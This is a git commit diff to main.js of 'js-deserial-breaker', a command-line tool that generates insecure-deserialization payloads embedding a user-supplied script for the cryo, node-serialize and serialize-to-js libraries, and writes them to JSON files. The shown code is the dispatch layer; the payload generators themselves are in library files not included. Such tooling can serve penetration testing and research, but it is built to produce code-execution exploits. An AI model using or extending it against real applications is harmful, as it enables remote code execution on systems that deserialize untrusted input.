0a213c0eaa1860b72754c2f1748ed488be182f98
philia897 <wangzekun.felix@gmail.com>
2022-05-24 17:09:44 +0200

    js breaker almost done, still need to add more libraries

--- javascript/js-deserial-breaker/main.js
+++ javascript/js-deserial-breaker/main.js
@@ -1,6 +1,6 @@
 const myArgs = process.argv.slice(2);
 
-var support_libraries = ['cryo']
+var support_libraries = ['cryo', 'node-serialize', 'serialize-to-js']
 var help = `
 *** Javascript Deserialization Breaker ***    
 
@@ -20,7 +20,7 @@ if(myArgs.length < 3){
 switch (myArgs[0]) {
     case 'cryo':
         var fs = require('fs')
-        fs.readFile('remoteCode.js','utf8',function(error,data){
+        fs.readFile(myArgs[2],'utf8',function(error,data){
             if(error){
                 console.log("ERROR: InsertScriptFile doesn't exist!")
             }else{
@@ -28,7 +28,39 @@ switch (myArgs[0]) {
                 cryoGen.init(myArgs[1],data.toString())        
                 var payload = cryoGen.genPayload()
                 cryoGen.testPayload(payload)
-                fs.writeFile("cryo_payload.json", payload, (err) => {if(err) console.log("ERROR: Can't write payload into file"); else console.log("INFO: Saved the payload to cryo_payload.json")})
+                var filename = `${support_libraries[0]}_payload.json`
+                fs.writeFile(filename, payload, (err) => {saveCallBack(err,filename)})
+            }
+        })    
+        break;
+
+    case 'node-serialize':
+        var fs = require('fs');
+        fs.readFile(myArgs[2],'utf8',function(error,data){
+            if(error){
+                console.log("ERROR: InsertScriptFile doesn't exist!")
+            }else{
+                var Gen = require('./lib/nodeSerializeGen')
+                Gen.init(myArgs[1],data.toString())        
+                var payload = Gen.genPayload()
+                Gen.testPayload(payload)
+                var filename = `${support_libraries[1]}_payload.json`
+                fs.writeFile(filename, payload, (err) => {saveCallBack(err,filename)})            }
+        })    
+        break;
+
+    case 'serialize-to-js':
+        var fs = require('fs');
+        fs.readFile(myArgs[2],'utf8',function(error,data){
+            if(error){
+                console.log("ERROR: InsertScriptFile doesn't exist!")
+            }else{
+                var Gen = require('./lib/serialize2jsGen')
+                Gen.init(myArgs[1],data.toString())        
+                var payload = Gen.genPayload()
+                Gen.testPayload(payload)
+                var filename = `${support_libraries[2]}_payload.json`
+                fs.writeFile(filename, payload, (err) => {saveCallBack(err,filename)})            
             }
         })    
         break;
@@ -37,4 +69,10 @@ switch (myArgs[0]) {
         console.log("ERROR: Please choose a supported vulnerable library!")
         console.log(help)
         break;
+}
+
+
+function saveCallBack(err,filename) {
+    if(err) console.log("ERROR: Can't write payload into file"); 
+    else console.log(`INFO: Saved the payload to ${filename}`)
 }
